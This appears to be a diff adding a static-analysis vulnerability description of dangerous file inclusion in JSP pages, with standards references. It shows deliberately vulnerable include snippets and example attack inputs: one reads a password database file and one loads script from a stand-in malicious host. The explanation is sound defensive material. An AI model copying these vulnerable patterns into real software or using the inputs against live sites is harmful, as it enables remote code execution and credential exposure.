@@ -1,0 +1,26 @@
+
+							<!-- desc.dataflow.java.dangerous_file_inclusion -->						
+							<h1>
+							   Dangerous File Inclusion
+							</h1>
+							<h2>ABSTRACT</h2>
+							<p>
+							  Allowing unvalidated user input to control files that are included dynamically in a JSP can lead to malicious code execution.
+							</p>
+							<h2>EXPLANATION</h2>
+							<p>
+							  Many modern web scripting languages enable code re-use and modularization through the ability to include additional source files within one encapsulating file. This ability is often used to apply a standard look and feel to an application (templating), share functions without the need for compiled code, or break the code into smaller more manageable files. Included files are interpreted as part of the parent file and executed in the same manner. File inclusion vulnerabilities occur when the path of the included file is controlled by unvalidated user input. <br><br><b>Example 1:</b> The following is an example of Local File Inclusion vulnerability. The sample code takes a user specified template name and includes it in the JSP page to be rendered. <br><pre><br>...<br>&lt;jsp:include page="&lt;%= (String)request.getParameter(\"template\")%&gt;"&gt;<br>...<br></pre><br>If the attacker specifies a valid file to the dynamic include statement, the contents of that file will be passed to the JSP interpreter to be rendered on the page.<br><br>In the case of an attack vector of the form<br><pre><br>specialpage.jsp?template=/WEB-INF/database/passwordDB<br></pre><br>the JSP interpreter will render the contents of the <code>/WEB-INF/database/passwordDB</code> file to the JSP page thus compromising the security of the system.<br><br>Worse, if the attacker can specify a path to a remote site controlled by the attacker, then the dynamic include statement will execute arbitrary malicious code supplied by the attacker.<br><br><b>Example 2:</b>  An example of Remote File Inclusion vulnerability is shown below. The sample code uses the <code>c:import</code> tag to import a user specified remote file into the current JSP page.<br><pre><br>...<br>&lt;c:import url="&lt;%= request.getParameter("privacy")%&gt;"&gt;<br>...<br></pre><br>An attack vector of the form<br><pre><br>policy.jsp?privacy=http://www.malicioushost.com/attackdata.js<br></pre><br>can inject malicious code into the current JSP page from a remote site controlled by the attacker.<br>
+							</p>
+							 								<h2>REFERENCES</h2>
+																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
+																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
+																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A3 Malicious File Execution</em> <br></p>
+																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
+																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 94, CWE ID 98</em> <br></p>
+																									   <p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.3</em> <br></p>
+																									   <p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
+																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
+																									   <p>[9] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 094</em> <br></p>
+																									   <p>[10] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Risky Resource Management - CWE ID 098</em> <br></p>
+																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
+																														
